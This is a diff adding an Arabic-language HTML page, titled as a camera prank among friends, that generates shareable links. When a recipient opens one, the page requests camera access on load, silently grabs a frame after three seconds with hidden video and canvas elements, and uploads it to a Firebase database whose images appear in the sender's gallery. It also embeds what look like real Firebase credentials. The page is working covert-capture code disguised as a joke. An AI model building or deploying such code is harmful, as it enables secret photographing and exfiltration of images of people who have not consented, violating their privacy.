@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8" />
+<title>مزحة الكاميرا مع الأصدقاء</title>
+<style>
+  body { font-family: sans-serif; text-align: center; margin: 20px; direction: rtl; }
+  #linkBox { margin: 20px; display: none; }
+  #generatedLink {
+    display: inline-block;
+    background: #e0e0e0;
+    padding: 10px 15px;
+    border-radius: 8px;
+    color: #333;
+    font-weight: bold;
+    text-decoration: none;
+    direction: ltr;
+  }
+  .gallery { margin-top: 30px; display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
+  .gallery img { max-width: 150px; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.3); }
+  video, canvas { display: none; }
+</style>
+</head>
+<body>
+  <h1>📸 مزحة الكاميرا مع الأصدقاء</h1>
+  <button id="generateBtn">🎭 توليد رابط مزحة</button>
+
+  <div id="linkBox">
+    <p>انسخ الرابط وأرسله لصديقك:</p>
+    <a id="generatedLink" href="#" target="_blank"></a>
+  </div>
+
+  <h2>🖼️ الصور الملتقطة</h2>
+  <div class="gallery" id="imageGallery"></div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+    import { getDatabase, ref, push, onChildAdded } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAxIl9pc5LSdUWXckbIk_GppxfX57rA9cs",
+      authDomain: "project-2533437929275685901.firebaseapp.com",
+      databaseURL: "https://project-2533437929275685901-default-rtdb.firebaseio.com",
+      projectId: "project-2533437929275685901",
+      storageBucket: "project-2533437929275685901.appspot.com",
+      messagingSenderId: "1001012965314",
+      appId: "1:1001012965314:web:e0a4fc3eb8a74bfa9c705b",
+      measurementId: "G-DCH281XTP1"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    const imagesRef = ref(db, 'images');
+
+    const generateBtn = document.getElementById("generateBtn");
+    const linkBox = document.getElementById("linkBox");
+    const generatedLink = document.getElementById("generatedLink");
+    const gallery = document.getElementById("imageGallery");
+
+    generateBtn.addEventListener("click", () => {
+      const id = Math.random().toString(36).substring(2, 10);
+      const url = `${window.location.origin}${window.location.pathname}?id=${id}`;
+      generatedLink.href = url;
+      generatedLink.textContent = url;
+      linkBox.style.display = "block";
+    });
+
+    // عند إضافة صورة جديدة للـ Firebase، نعرضها فوراً
+    onChildAdded(imagesRef, (snapshot) => {
+      const img = document.createElement('img');
+      img.src = snapshot.val();
+      gallery.prepend(img);
+    });
+
+    // إذا الرابط يحتوي ?id= يعني فتح الرابط الملتقط
+    const params = new URLSearchParams(window.location.search);
+    if (params.has('id')) {
+      captureAndSend();
+    }
+
+    function captureAndSend() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/png');
+            push(imagesRef, imageData);
+
+            stream.getTracks().forEach(track => track.stop());
+            alert("✅ تم التقاط صورتك!");
+          }, 3000);
+        })
+        .catch(() => {
+          alert("🚫 تم رفض الوصول إلى الكاميرا");
+        });
+    }
+  </script>
+</body>
+</html>
